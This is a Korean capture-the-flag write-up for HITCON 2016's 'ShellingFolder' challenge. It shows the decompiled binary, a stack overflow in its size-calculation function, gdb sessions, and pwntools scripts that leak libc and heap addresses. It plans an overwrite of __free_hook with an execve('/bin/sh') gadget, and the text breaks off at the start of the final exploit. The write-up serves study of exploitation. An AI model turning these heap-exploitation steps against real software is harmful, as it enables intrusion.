---
title: "Pwn-ShellingFolder(200) - Solved by 39 Teams"
sidebar_position: 1
---


## **Information**

### **Description**
```
This is a magic folder.  
nc 52.69.237.212 4869

[shellingfolder](https://s3-ap-northeast-1.amazonaws.com/hitcon2016qual/shellingfolder_42848afa70a13434679fac53a471239255753260)  
[libc.so.6](https://s3-ap-northeast-1.amazonaws.com/hitcon2016qual/libc.so.6_375198810bb39e6593a968fcbcf6556789026743)
```
### **Files**

* [shellingfolder\_42848afa70a13434679fac53a471239255753260](/attachments/7536652/7537075.bin)
* [libc.so.6\_375198810bb39e6593a968fcbcf6556789026743](/attachments/7536652/7537074.bin)

### **Source Code**

## **Write up**

### File information

```sh title="File information"
autolycos@ubuntu:~/CTF/HITCON2016/shellingfolder$ file shellingfolder_42848afa70a13434679fac53a471239255753260 
shellingfolder_42848afa70a13434679fac53a471239255753260: ELF 64-bit LSB  shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=011a2a4e3b9edc0ee9b08578c62ca76dec45ef64, stripped
autolycos@ubuntu:~/CTF/HITCON2016/shellingfolder$ checksec.sh --file shellingfolder_42848afa70a13434679fac53a471239255753260 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   shellingfolder_42848afa70a13434679fac53a471239255753260
autolycos@ubuntu:~/CTF/HITCON2016/shellingfolder$
```

### Binary analysis

* **해당 문제를 실행하면 다음과 같은 메뉴를 출력합니다.**
  + 1.현재 폴더를 나열하십시오.
  + 2.현재 폴더 변경
  + 3.폴더 만들기
  + 4.현재 폴더에 파일 만들기
  + 5.폴더 또는 파일을 제거하십시오.
  + 6.폴더 크기 계산
  + 7.종료

```sh title="Menu"
**************************************
            ShellingFolder            
**************************************
 1.List the current folder            
 2.Change the current folder          
 3.Make a folder                      
 4.Create a file in current folder    
 5.Remove a folder or a file          
 6.Caculate the size of folder        
 7.Exit                               
**************************************
Your choice:
```

#### **Main**

* **해당 문제의 main() 함수기능은 다음과 같습니다.**  
  + PrintMenu()함수를 이용하여 Menu 목록을 출력합니다.
  + InputNumber()함수를 이용하여 사용자로 부터 사용할 Menu의 번호를 입력 받습니다.
* **메뉴를 출력하기 전에 아래 구조체를 이용해 "rootFolder"를 생성합니다.**

```c title="FileInfo struct"
struct FileInfo{
	struct FileInfo *list[10];
	struct FileInfo *parentFolder;
	char docName[32];
	long size;
	int fileType;
}
```

```c title="main function"
void __fastcall main(__int64 a1, char **a2, char **a3)
{
  __int64 v3; // rax
  unsigned int savedregs; // [rsp+10h] [rbp+0h]

  setSIGALM();
  v3 = (__int64)calloc(1uLL, 0x88uLL);
  rootFolder = (struct FileInfo *)v3;
  v3 += 88LL;
  *(_DWORD *)v3 = 'toor';
  *(_BYTE *)(v3 + 4) = 0;
  rootFolder->parentFolder = rootFolder;
  rootFolder->fileType = 1;
  gFolder = rootFolder;
  while ( 1 )
  {
    PrintMenu();
    InputNumber();
    switch ( (unsigned int)&savedregs )
    {
      case 1u:
        ListFloder(gFolder);
        break;
      case 2u:
        ChangeFolder(gFolder);
        break;
      case 3u:
        MakeFolder(gFolder);
        break;
      case 4u:
        CreateFile(gFolder);
        break;
      case 5u:
        Remove(gFolder);
        break;
      case 6u:
        Caculate(gFolder);
        break;
      case 7u:
        puts("bye bye");
        exit(0);
        return;
      default:
        puts("Invalid choice");
        break;
    }
  }
}
```

#### **List the current folder**

* **해당 함수는 다음과 같은 기능을 합니다.**
  + "gFolder" 전역변수의 list[]에 저장된 폴더명과 파일명을 출력합니다.

```c title="ListFloder function"
unsigned __int64 __fastcall ListFloder(FileInfo *folder)
{
  signed int i; // [rsp+18h] [rbp-38h]
  unsigned __int64 v3; // [rsp+48h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  if ( !folder )
    exit(1);
  puts("----------------------");
  for ( i = 0; i <= 9; ++i )
  {
    if ( folder->list[i] )
    {
      if ( folder->list[i]->fileType )
        printf("\x1B[32m%s\x1B[0m\n", folder->list[i]->docName);
      else
        puts(folder->list[i]->docName);
    }
  }
  puts("----------------------");
  return __readfsqword(0x28u) ^ v3;
}
```

#### **Change the current folder**

* **해당 함수는 다음과 같은 기능을 합니다.**
  + 다음과 같은 방법을 이용해 해당 함수는 "gFolder" 전역변수가 가리리키는 주소 값을 변경합니다.
  + 사용자로 부터 찾고자 하는 폴더의 이름을 입력받습니다.
    - 입력 값이 ".."과 같다면 "gFolder" 전역변수의 parentFolder의 주소를 "gFolder" 전역변수에 저장합니다.
    - 입력 값이 ".."과 같지 않다면 "gFolder" 전역변수의 list[] 변수에 저장된 폴더의 이름을 검색합니다.
      * 입력 값과 같은 이름의 폴더가 있으면 해당 폴더의 주소(list[i])를 "gFolder" 전역변수에 저장합니다.
      * 입력 값과 같은 이름의 폴더가 없으면 "No such Folder" 문구를 출력합니다.

```c title="ChangeFolder function"
signed __int64 __fastcall ChangeFolder(FileInfo *folder)
{
  signed int i; // [rsp+1Ch] [rbp-34h]
  char folderName[40]; // [rsp+20h] [rbp-30h]
  unsigned __int64 v4; // [rsp+48h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  if ( !folder )
    exit(-1);
  printf("Choose a Folder :");
  InputName(folderName, 31);
  if ( !strcmp(folderName, "..") )
  {
    gFolder = folder->parentFolder;
    puts("successful");
  }
  else
  {
    for ( i = 0; i <= 9; ++i )
    {
      if ( folder->list[i] && folder->list[i]->fileType == 1 && !strcmp(folder->list[i]->docName, folderName) )
      {
        gFolder = folder->list[i];
        puts("successful");
        return 1LL;
      }
    }
    puts("No such Folder");
  }
  return 0LL;
}
```

#### **Make a folder**

* **해당 함수는 다음과 같은 기능을 합니다.**
  + calloc() 함수를 이용해 FileInfo 구조체의 공간을 생성합니다.
    - InputName() 함수를 이용해 사용자로 부터 폴더의 이름을 입력 받습니다.
    - 다음과 같은 기본적인 설정을 진행합니다.
      * newFolder→fileType = 1(폴더)
      * newFolder→parentFolder = folder(전역변수에 저장된 주소)
      * newFolder→size = 0
  + checkEmptyList() 함수를 이용해 전역변수의 list[]에 새로 생성한 폴더 정보를 저장 할 공간이 있는지 확인합니다.

```c title="MakeFolder function"
int __fastcall MakeFolder(struct FileInfo *folder)
{
  int result; // eax
  FileInfo *newFolder; // [rsp+18h] [rbp-8h]

  if ( !folder )
    exit(1);
  newFolder = (FileInfo *)calloc(1uLL, 0x88uLL);
  if ( !newFolder )
  {
    puts("Malloc error!!");
    exit(-1);
  }
  printf("Name of Folder:", 136LL);
  InputName((unsigned __int8 *)newFolder->docName, 31);
  newFolder->fileType = 1;
  newFolder->parentFolder = folder;
  newFolder->size = 0LL;
  if ( (unsigned int)checkEmptyList(folder, newFolder) == 1 )
    result = puts("successful");
  else
    result = puts("Failed");
  return result;
}
```

#### **Create a file in current folder**

* **해당 함수는 다음과 같은 기능을 합니다.**
  + 해당 함수의 기능은 MakeFolder() 함수의 기능과 일부를 제외하고 동일합니다.
  + MakeFolder() 함수의 기능과 다른 부분은 다음과 같습니다.  
    - newFile→fileType = 0(파일)
    - newFile→size = 사용자가 입력한 숫자 값

```c title="CreateFile function"
int __fastcall CreateFile(FileInfo *folder)
{
  int result; // eax
  FileInfo *newFile; // [rsp+18h] [rbp-8h]

  if ( !folder )
    exit(1);
  newFile = (FileInfo *)calloc(1uLL, 0x88uLL);
  if ( !newFile )
  {
    puts("Malloc error!!");
    exit(-1);
  }
  printf("Name of File:", 136LL);
  InputName((unsigned __int8 *)newFile->docName, 31);
  newFile->fileType = 0;
  newFile->parentFolder = folder;
  printf("Size of File:", 31LL);
  newFile->size = InputNumber();
  if ( (unsigned int)checkEmptyList((__int64)folder, (__int64)newFile) == 1 )
    result = puts("successful");
  else
    result = puts("Failed");
  return result;
}
```

#### **Remove a folder or a file**

* **해당 함수는 다음과 같은 기능을 합니다.**
  + 사용자로 부터 삭제 할 폴더,파일의 이름을 입력받습니다.
  + 입력 값은 "gFolder" 전역변수의 list[]에 저장된 docName과 비교합니다.  
    - 동일한 이름이 있을 경우 FreeFolder() 함수를 호출합니다.
    - 해당 list[]에 0을 저장해 기존에 저장되어 있는 정보를 제거합니다.

```c title="Remove function"
signed __int64 __fastcall Remove(FileInfo *folder)
{
  signed int i; // [rsp+1Ch] [rbp-34h]
  char fileName[40]; // [rsp+20h] [rbp-30h]
  unsigned __int64 v4; // [rsp+48h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  if ( !folder )
    exit(-1);
  printf("Choose a Folder or file :");
  InputName(fileName, 31);
  for ( i = 0; i <= 9; ++i )
  {
    if ( folder->list[i] && !strcmp(folder->list[i]->docName, fileName) )
    {
      FreeFolder(folder->list[i], fileName);
      folder->list[i] = 0LL;
      return 1LL;
    }
  }
  puts("No such Folder");
  return 0LL;
}
```

#### **FreeFolder**

* **해당 함수는 다음과 같은 기능을 합니다.**
  + 삭제할 폴더,파일의 정보를 전달받아 type을 확인합니다.
    - 삭제할 대상이 폴더일 경우 해당 폴더 아래에 존재하는 파일과 폴더를 FreeFolder() 함수를 이용해 삭제합니다.
      * 하위 파일에 대한 정리가 끝나면 free()함수를 이용해 해당 폴더의 정보를 저장했던 영역을 해제합니다.
    - 삭제할 대상이 파일일 경우 free()함수를 이용해 사용한 공간을 해제합니다.

```c title="FreeFolder function"
void __fastcall FreeFolder(FileInfo *delFolder, char *fileName)
{
  signed int i; // [rsp+1Ch] [rbp-4h]

  if ( delFolder )
  {
    if ( delFolder->fileType )
    {
      for ( i = 0; i <= 9; ++i )
      {
        if ( delFolder->list[i] )
          FreeFolder(delFolder->list[i], fileName);
      }
      free(delFolder);
    }
    else
    {
      free(delFolder);
    }
  }
}
```

#### **Calculate the size of folder**

* **해당 함수는 다음과 같은 기능을 합니다.**
  + "isDocName" 변수의 영역을 0으로 초기화 합니다.
  + "gFolder" 전역변수의 size의 주소 값을 ptrSize 포인터 변수에 저장합니다.(ptrSize = &folder->size;)
  + callMemcopy() 함수를 이용해 folder→list[count]→docName의 내용을 isDocName 변수에 복사합니다.
  + "gFolder" 전역변수의 list[]에 저장된 type 정보를 확인합니다.
    - type이 폴더(1) 일 경우 \*ptrSize 변수에 \*ptrSize 값을 저장합니다.
    - type이 폴더(0) 일 경우 \*ptrSize 변수에 해당 파일의 size값을 더 합니다.
  + 취약성을 해당 함수에서 callMemcopy() 함수를 호출하는 부분에서 발생합니다.(Stack overflow)
    - "isDocName" 변수의 크기는 24byte 입니다.
    - "folder→list[count]→docName" 변수의 크기는 32 byte 입니다.
    - 즉, "folder→list[count]→docName"을 이용해서 Stack 영역(\*ptrSize)을 덮어쓸 수 있습니다.
  + 그리고 파일의 이름을 출력할 때 "isDocName" 변수를 이용하고 있기 때문에 \*ptrSize에 저장된 Heap 주소를 추출 할 수 있습니다.

```c title="Caculate function"
unsigned __int64 __fastcall Caculate(FileInfo *folder)
{
  char isDocName[24]; // [rsp+10h] [rbp-30h]
  __int64 *ptrSize; // [rsp+28h] [rbp-18h]
  int count; // [rsp+30h] [rbp-10h]
  unsigned __int64 v5; // [rsp+38h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  if ( !folder )
    exit(1);
  count = 0;
  memset(isDocName, 0, 32uLL);
  while ( count <= 9 )
  {
    if ( folder->list[count] )
    {
      ptrSize = &folder->size;
      callMemcopy(isDocName, folder->list[count]->docName);
      if ( folder->list[count]->fileType == 1 )
      {
        *ptrSize = *ptrSize;
      }
      else
      {
        printf("%s : size %ld\n", isDocName, folder->list[count]->size);
        *ptrSize += folder->list[count]->size;
      }
    }
    ++count;
  }
  printf("The size of the folder is %ld\n", folder->size);
  return __readfsqword(0x28u) ^ v5;
}
```

#### **callMemcopy**

* **해당 함수는 다음과 같은 기능을 합니다.**  
  + heap변수에 저장된 문자열의 크기를 추출합니다.
  + memcpy() 함수를 이용하여 stack변수에 heap변수에 저장된 문자열을 저장합니다.

```c title="callMemcopy function"
void *__fastcall callMemcopy(void *stack, const char *heap)
{
  size_t len; // ST28_8

  len = strlen(heap);
  return memcpy(stack, heap, len);
}
```

### Debugging

* **다음과 같은 Break point를 설정합니다.**
  + Caculate() → call memset : Base addresss + 0x1378
  + callMemcopy() → call memcpy : Base addresss + 0x1331

```sh title="Break point"
lazenca0x0@ubuntu:~/CTF/HITCON/ShellingFolder$ gdb -q ./shell*
Reading symbols from ./shellingfolder_42848afa70a13434679fac53a471239255753260...(no debugging symbols found)...done.
gdb-peda$ handle SIGALRM nopass
Signal        Stop	Print	Pass to program	Description
SIGALRM       No	Yes	No		Alarm clock
gdb-peda$ b *0x555555554000 + 0x1378
Breakpoint 1 at 0x555555555378
gdb-peda$ b *0x555555554000 + 0x13A5
Breakpoint 2 at 0x555555555378
gdb-peda$ b *0x555555554000 + 0x1331
Breakpoint 3 at 0x555555555331
gdb-peda$
```

* **Overflow를 확인하기 위해 다음과 같이 입력합니다.**
  + "4.Create a file in current folder" 기능을 호출 후 "Name of File:"의 값으로 "A \* 24 + B \* 7"를 입력합니다.
  + "Calculate the size of folder" 기능을 호출 합니다.
* **다음과 같이 "isDocName[24]" 변수의 변화를 확인 할 수 있습니다.**
  + memset() 함수에 의해 "isDocName[24]" 영역이 0으로 초기화됩니다.
  + "ptrSize"(0x7fffffffe138) 영역에 "&folder→size"(0x555555757088)의 주소 값이 저장됩니다.

```sh title="Overflow confirmation"
gdb-peda$ r
Starting program: /home/lazenca0x0/CTF/HITCON/ShellingFolder/shellingfolder_42848afa70a13434679fac53a471239255753260 
**************************************
            ShellingFolder            
**************************************
 1.List the current folder            
 2.Change the current folder          
 3.Make a folder                      
 4.Create a file in current folder    
 5.Remove a folder or a file          
 6.Caculate the size of folder        
 7.Exit                               
**************************************
Your choice:4
Name of File:AAAAAAAAAAAAAAAAAAAAAAAABBBBBBB
Size of File:successful
**************************************
            ShellingFolder            
**************************************
 1.List the current folder            
 2.Change the current folder          
 3.Make a folder                      
 4.Create a file in current folder    
 5.Remove a folder or a file          
 6.Caculate the size of folder        
 7.Exit                               
**************************************
Your choice:6
Breakpoint 1, 0x0000555555555378 in ?? ()
gdb-peda$ i r rdi
rdi            0x7fffffffe120	0x7fffffffe120
gdb-peda$ x/6gx 0x7fffffffe120
0x7fffffffe120:	0x0000555555555820	0x00000006f7a7c7fa
0x7fffffffe130:	0x0000000000000a36	0x00007fffffffe150
0x7fffffffe140:	0x0000555500000000	0x06a271d09477ed00
gdb-peda$ ni
0x000055555555537d in ?? ()
gdb-peda$ x/6gx 0x7fffffffe120
0x7fffffffe120:	0x0000000000000000	0x0000000000000000
0x7fffffffe130:	0x0000000000000000	0x0000000000000000
0x7fffffffe140:	0x0000555500000000	0x06a271d09477ed00
gdb-peda$ c
Continuing.
Breakpoint 2, 0x00005555555553a5 in ?? ()
gdb-peda$ x/6gx 0x7fffffffe120
0x7fffffffe120:	0x0000000000000000	0x0000000000000000
0x7fffffffe130:	0x0000000000000000	0x0000555555757088
0x7fffffffe140:	0x0000555500000000	0x06a271d09477ed00
gdb-peda$
```

* **다음과 같이 Stack overflow를 확인 할 수 있습니다.**
  + callMemcopy() 함수의 memcpy()에 의해 "ptrSize"(0x7fffffffe138) 영역이 사용자 입력값으로 덮어썼습니다.
    - 0x555555757088 → 0x0042424242424242
  + 즉, 공격자는 해당 취약성를 이용하여 ptrSize의 값을 마음대로 변경할 수 있습니다.

```sh title="Stack overflow confirmation"
gdb-peda$ c
Continuing.

Breakpoint 3, 0x0000555555555331 in ?? ()
gdb-peda$ x/6gx 0x7fffffffe120
0x7fffffffe120:	0x4141414141414141	0x4141414141414141
0x7fffffffe130:	0x4141414141414141	0x0042424242424242
0x7fffffffe140:	0x0000555500000000	0x06a271d09477ed00
gdb-peda$
```

### Structure of Exploit code

* Payload의 순서는 다음과 같습니다.

:::note[Payload 순서]
1. Leak Libc Base
2. Leak Heap Addresss
3. offset 추출
4. Overflow
5. Shell 실행
:::

* 이를 조금더 자세하게 설명하면 다음과 같습니다.

:::note[상세 설명]
1. LeakLibcBase
   1. "Remove a folder or a file"
   2. "Create a file in current folder"
   3. "List the current folder"
2. Leak Heap Addresss
3. offset 추출
   1. System()
   2. "/bin/sh" execve()
4. Overflow
   1. Overflow 대상 찾기(\_\_free\_hook)
   2. 대상 영역에 Overflow
5. Shell 실행
:::

* payload를 바탕으로 공격을 위해 알아내어야 할 정보는 다음과 같습니다.

:::note[확인해야 할 정보 목록]

* Leak libc addresss
* system offset
* Overflow 대상
:::

### Information for attack

#### Leak Libc addresss

* **다음과 같은 방법으로 Libc addresss를 추출 할 수 있습니다.**
  + 우선 폴더를 2개와 파일 1개를 생성합니다.  
    - 폴더 2개를 이용해 Heap영역에 Libc addresss를 생성합니다.
    - 파일을 이용해 "rootFolder"의 list[1]에 저장된 값을 변경합니다.

```sh title="Default Settings"
gdb-peda$ r
Starting program: /home/lazenca0x0/CTF/HITCON/ShellingFolder/shellingfolder_42848afa70a13434679fac53a471239255753260
**************************************
            ShellingFolder           
**************************************
 1.List the current folder           
 2.Change the current folder         
 3.Make a folder                     
 4.Create a file in current folder   
 5.Remove a folder or a file         
 6.Caculate the size of folder       
 7.Exit                              
**************************************
Your choice:3
Breakpoint 2, 0x000055555555501f in ?? ()
gdb-peda$ i r rax
rax            0x5555557570a0   0x5555557570a0
gdb-peda$ c
Continuing.
Name of Folder:AAAA
successful
**************************************
            ShellingFolder           
**************************************
 1.List the current folder           
 2.Change the current folder         
 3.Make a folder                     
 4.Create a file in current folder   
 5.Remove a folder or a file         
 6.Caculate the size of folder       
 7.Exit                              
**************************************
Your choice:3
Breakpoint 2, 0x000055555555501f in ?? ()
gdb-peda$ i r rax
rax            0x555555757130   0x555555757130
gdb-peda$ c
Continuing.
Name of Folder:BBBB
successful
**************************************
            ShellingFolder           
**************************************
 1.List the current folder           
 2.Change the current folder         
 3.Make a folder                     
 4.Create a file in current folder   
 5.Remove a folder or a file         
 6.Caculate the size of folder       
 7.Exit                              
**************************************
Your choice:4
Name of File:CCCCCCCCCCCCCCCCCCCCCCCCD
Size of File:64
successful
**************************************
            ShellingFolder           
**************************************
 1.List the current folder           
 2.Change the current folder         
 3.Make a folder                     
 4.Create a file in current folder   
 5.Remove a folder or a file         
 6.Caculate the size of folder       
 7.Exit                              
**************************************
Your choice:
```

* **다음과 같이 폴더 삭제에 의해 Heap 영역에 Libc addresss가 생성됩니다.**
  + 생성된 Libc addresss는 main\_arena의 top 주소 입니다.
  + 해당 영역이 unsorted bin에 등록되면서 fd, bk영역에 값이 생성되었습니다.
  + bk영역을 출력하기 위해서는 "rootFolder"→list[1]의 값이 변경되어야 합니다.
    - "rootFolder"→list[1]에 저장되어야 할 주소는 0x5555557570e0 입니다.
      * bk(0x555555757138) - 0x58 = 0x5555557570e0
    - "rootFolder"→list[1]에 저장된 값에서 0x40(64)를 더해야 합니다.
      * 0x5555557570e0 - "rootFolder"→list[1]에 저장된 값(0x00005555557570a0) = 0x40(64)

```sh title="Create Libc addresss"
Your choice:5
Choose a Folder or file :BBBB
Breakpoint 1, 0x0000555555554e11 in ?? ()
gdb-peda$ x/12gx 0x555555757130
0x555555757130:	0x0000000000000000	0x0000000000000000
0x555555757140:	0x0000000000000000	0x0000000000000000
0x555555757150:	0x0000000000000000	0x0000000000000000
0x555555757160:	0x0000000000000000	0x0000000000000000
0x555555757170:	0x0000000000000000	0x0000000000000000
0x555555757180:	0x0000555555757010	0x0000000042424242
gdb-peda$ ni
0x0000555555554e16 in ?? ()
gdb-peda$ x/12gx 0x555555757130
0x555555757130:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
0x555555757140:	0x0000000000000000	0x0000000000000000
0x555555757150:	0x0000000000000000	0x0000000000000000
0x555555757160:	0x0000000000000000	0x0000000000000000
0x555555757170:	0x0000000000000000	0x0000000000000000
0x555555757180:	0x0000555555757010	0x0000000042424242
gdb-peda$ x/gx 0x555555757010 
0x555555757010:	0x00005555557570a0
gdb-peda$ x/gx 0x00005555557570a0 + 0x58
0x5555557570f8:	0x0000000041414141
gdb-peda$ x/20gx 0x00005555557570a0
0x5555557570a0:	0x0000000000000000	0x0000000000000000
0x5555557570b0:	0x0000000000000000	0x0000000000000000
0x5555557570c0:	0x0000000000000000	0x0000000000000000
0x5555557570d0:	0x0000000000000000	0x0000000000000000
0x5555557570e0:	0x0000000000000000	0x0000000000000000
0x5555557570f0:	0x0000555555757010	0x0000000041414141
0x555555757100:	0x0000000000000000	0x0000000000000000
0x555555757110:	0x0000000000000000	0x0000000000000000
0x555555757120:	0x0000000000000001	0x0000000000000091
0x555555757130:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
gdb-peda$ p/x 0x555555757138 - 0x58
$3 = 0x5555557570e0
gdb-peda$ p/x 0x5555557570e0 - 0x5555557570a0
$4 = 0x40
gdb-peda$ p/d 0x40
$5 = 64
```

* **다음과 같은 방법으로 "rootFolder" 변수의 값을 변경할 수 있습니다.**
  + 사용자가 입력한 파일명으로 인해 "ptrSize"에 저장된 주소 값이 1byte 변경되었습니다.
  + 즉, 해당 값을 "rootFolder"의 주소 값으로 변경할 수 있습니다.
    - 'D' 대신 0x10을 전달
    - Ex) "C" \* 24 + 0x10 : 0x0000555555757088 → 0x0000555555757044

```sh title="Stack Overflow"
gdb-peda$ c
Continuing.
**************************************
            ShellingFolder            
**************************************
 1.List the current folder            
 2.Change the current folder          
 3.Make a folder                      
 4.Create a file in current folder    
 5.Remove a folder or a file          
 6.Caculate the size of folder        
 7.Exit                               
**************************************
Your choice:6
Breakpoint 3, 0x0000555555555331 in ?? ()
gdb-peda$ x/6gx 0x7fffffffe120
0x7fffffffe120:	0x0000000041414141	0x0000000000000000
0x7fffffffe130:	0x0000000000000000	0x0000555555757088
0x7fffffffe140:	0x0000555500000000	0x6ad1e428fbe39100
gdb-peda$ c
Continuing.
Breakpoint 3, 0x0000555555555331 in ?? ()
gdb-peda$ x/6gx 0x7fffffffe120
0x7fffffffe120:	0x4343434343434343	0x4343434343434343
0x7fffffffe130:	0x4343434343434343	0x0000555555757044
0x7fffffffe140:	0x0000555500000002	0x6ad1e428fbe39100
gdb-peda$ set *0x7fffffffe138 = 0x55757010
gdb-peda$ x/6gx 0x7fffffffe120
0x7fffffffe120:	0x4343434343434343	0x4343434343434343
0x7fffffffe130:	0x4343434343434343	0x0000555555757010
0x7fffffffe140:	0x0000555500000002	0x6ad1e428fbe39100
gdb-peda$ x/4gx 0x0000555555757010
0x555555757010:	0x00005555557570a0	0x0000000000000000
0x555555757020:	0x00005555557571c0	0x0000000000000000
gdb-peda$
```

* **다음과 같이 파일의 size 값에 의해 "rootFolder"의 list[1]에 저장된 값을 변경할 수 있습니다.**
  + Stack overflow에 의해 ptrSize의 주소는 "rootFolder"→list[1]가 되었습니다.(0x555555757010)
  + 파일의 size(0x40)값이 "rootFolder"→list[1]에 더해 집니다.
    - 0x555555757010: 0x00005555557570a0 +x040 = 0x5555557570e0
  + 출력할 폴더의 이름은 free chunk의 bk영역(0x5555557570e0 + 0x58)이 됩니다.

```sh title="Change the value of "rootFolder→list1""
Breakpoint 4, 0x000055555555543e in ?? ()
gdb-peda$ i r rax
rax            0x555555757010	0x555555757010
gdb-peda$ i r rdx
rdx            0x5555557570e0	0x5555557570e0
gdb-peda$ x/gx 0x5555557570e0 + 0x58
0x555555757138:	0x00007ffff7dd1b78
gdb-peda$
```

* **다음과 같이 Libc addresss를 확인 할 수 있습니다.**
  + Libc addresss : x??(0x7ffff7dd1b78)

```sh title="Leak libc address"
gdb-peda$ c
Continuing.
The size of the folder is 0
**************************************
            ShellingFolder            
**************************************
 1.List the current folder            
 2.Change the current folder          
 3.Make a folder                      
 4.Create a file in current folder    
 5.Remove a folder or a file          
 6.Caculate the size of folder        
 7.Exit                               
**************************************
Your choice:1
----------------------
x??
CCCCCCCCCCCCCCCCCCCCCCCCD
----------------------
**************************************
            ShellingFolder            
**************************************
 1.List the current folder            
 2.Change the current folder          
 3.Make a folder                      
 4.Create a file in current folder    
 5.Remove a folder or a file          
 6.Caculate the size of folder        
 7.Exit                               
**************************************
Your choice:
```

* **앞에서 확인한 내용은 다음과 같은 코드로 구현 할 수 있습니다.**

```python title="Leak libc address"
from pwn import *

PWN_FILE = "./shellingfolder_42848afa70a13434679fac53a471239255753260"

def Functions(number,name,size):
	p.sendlineafter(":",str(number))
	if (number != 1 or number != 6):
		p.sendlineafter(":",name)
	if number == 4:
		p.sendlineafter(":",str(size))
	
p = process(PWN_FILE)	

Functions(3,"AAAA",0)
Functions(3,"BBBB",0)
Functions(4,"C"*24+p8(0x10),64)
Functions(5,"BBBB",0)
Functions(6,"",0)
Functions(1,"",0)

p.recvuntil("----------------------\n")
libcAddr = u64(p.recv(6).ljust(8,"\x00"))
log.info("Libc Addresss : " + hex(libcAddr))
```

```sh title="Leak libc address"
autolycos@ubuntu:~/CTF/HITCON2016/Shellingfolder$ python Exploit.py 
[+] Starting local process './shellingfolder_42848afa70a13434679fac53a471239255753260': Done
[*] Libc Addresss : 0x7f108925f7b8
[*] Stopped program './shellingfolder_42848afa70a13434679fac53a471239255753260'
```

#### **Leak Heap Addresss**

* **Heap Addresss는 다음과 같은 방법으로 간단하게 추출할 수있습니다.**
  + "Create a file in current folder"기능에서 파일명으로 문자 24개만 입력합니다.
  + "Caculate the size of folder"기능을 호출하여 파일명을 출력할 때 \*ptrSize에 저장된 Heap Addresss도 출력 합니다.
  + 이러한 현상이 발생하는 이유는 파일명을 출력하기 위해 "isDocName" 변수와 "\*ptrSize" 사이에 공백없기 때문에 하나의 문장으로 인식하기 때문입니다.

```sh title="Leak Heap address"
Starting program: /home/autolycos/CTF/HITCON2016/Shellingfolder/shellingfolder_42848afa70a13434679fac53a471239255753260 
**************************************
            ShellingFolder            
**************************************
 1.List the current folder            
 2.Change the current folder          
 3.Make a folder                      
 4.Create a file in current folder    
 5.Remove a folder or a file          
 6.Caculate the size of folder        
 7.Exit                               
**************************************
Your choice:4
Name of File:AAAAAAAAAAAAAAAAAAAAAAAA
Size of File:0
successful
**************************************
            ShellingFolder            
**************************************
 1.List the current folder            
 2.Change the current folder          
 3.Make a folder                      
 4.Create a file in current folder    
 5.Remove a folder or a file          
 6.Caculate the size of folder        
 7.Exit                               
**************************************
Your choice:6

Breakpoint 1, 0x000055555555540a in ?? ()
(gdb) i r rax
rax            0x7fffffffe1b0	140737488347568
(gdb) x/4gx 0x7fffffffe1b0
0x7fffffffe1b0:	0x4141414141414141	0x4141414141414141
0x7fffffffe1c0:	0x4141414141414141	0x0000555555757088
(gdb)
```

* 다음과 같은 스크립트를 이용하여 추출할 수 있습니다.

```python title="Leak Heap address"
...
Functions(4,"Z"*24,0)	#Create File
Functions(6,"",0)		#Calc
p.recvuntil("Z"*24)
heapAddr = u64(p.recv(6).ljust(8,"\x00"))
Functions(5,"Z"*24,0)
...
```

#### **Find target to overwrite**

* **해당 문제에서는 다음과 같은 영역을 이용하여 쉽게 코드의 흐름을 변경할 수 있습니다.**
  + \_\_malloc\_hook
  + \_\_realloc\_hook
  + \_\_free\_hook
* **여기에서는 "\_\_free\_hook"영역을 사용합니다.**

:::note[Memory Allocation Hooks]
* GNU C 라이브러리는 적절한 hook 함수들을 명시함으로써 당신이 malloc,realloc과 free의 행위를 변경할 수 있도록 해준다. 
  + 이러한 hook들은, 예컨대, 동적 저장소 할당을 사용한 프로그램들을 디버그 하는데 도움을 준다.
  + hook 변수들은 'malloc.h'에 선언되어 있다.

|  |  |  |
| --- | --- | --- |
| **\_\_\_\_malloc\_\_hook** | 이 변수의 값은 malloc이 호출될 때마다 사용하는 함수에 대한 포인터이다. 당신은 이 함수를 malloc과 같은 모양으로 정의할 수 있다. | void \*function (size\_t size, const void \*caller) |
| **\_\_\_realloc\_\_hook** | 이 변수의 값은 realloc이 호출될 때마다 사용하는 함수에 대한 포인터이다. 당신은 이 함수를 realloc과 같은 모양으로 정의할 수 있다. | void \*function (void \*ptr, size\_t size, const void \*caller) |
| **\_\_\_\_free\_\_hook** | 이 변수의 값은 free가 호출될 때마다 사용하는 함수에 대한 포인터이다. 당신은 이 함수를 free와 같은 모양으로 정의할 수 있다. | void function (void \*ptr, const void \*caller) |
:::

#### **Offset(execve("/bin/sh"))**

* **system()함수에 "sh"를 전달하는 방법 말고 다른 방법도 있습니다.**
  + system()함수 내에 execve(/"bin/sh")를 호출하는 코드를 이용하는 것입니다.

```c title="glibc-2.24/sysdeps/posix/system.c"
#define	SHELL_PATH	"/bin/sh"	/* Path of the shell.  */
#define	SHELL_NAME	"sh"		/* Name to give it.  */

...

if (pid == (pid_t) 0)
{
      /* Child side.  */
      const char *new_argv[4];
      new_argv[0] = SHELL_NAME;
      new_argv[1] = "-c";
      new_argv[2] = line;
      new_argv[3] = NULL;

      /* Restore the signals.  */
      (void) __sigaction (SIGINT, &intr, (struct sigaction *) NULL);
      (void) __sigaction (SIGQUIT, &quit, (struct sigaction *) NULL);
      (void) __sigprocmask (SIG_SETMASK, &omask, (sigset_t *) NULL);
      INIT_LOCK ();

      /* Exec the shell.  */
      (void) __execve (SHELL_PATH, (char *const *) new_argv, __environ);
      _exit (127);
}
...
```

* 해당 코드의 offset은 0x4647c 입니다.

```sh title="IDA Pro Disassembly" 
.text:000000000004647C                 mov     rax, cs:environ_ptr_0
.text:0000000000046483                 lea     rdi, aBinSh     ; "/bin/sh"
.text:000000000004648A                 lea     rsi, [rsp+188h+var_158]
.text:000000000004648F                 mov     cs:dword_3C06C0, 0
.text:0000000000046499                 mov     cs:dword_3C06D0, 0
.text:00000000000464A3                 mov     rdx, [rax]
.text:00000000000464A6                 call    execve
```

## **Exploit Code**

### **system("sh;")**

```python title="Write a exploit code 1" 
from pwn import *
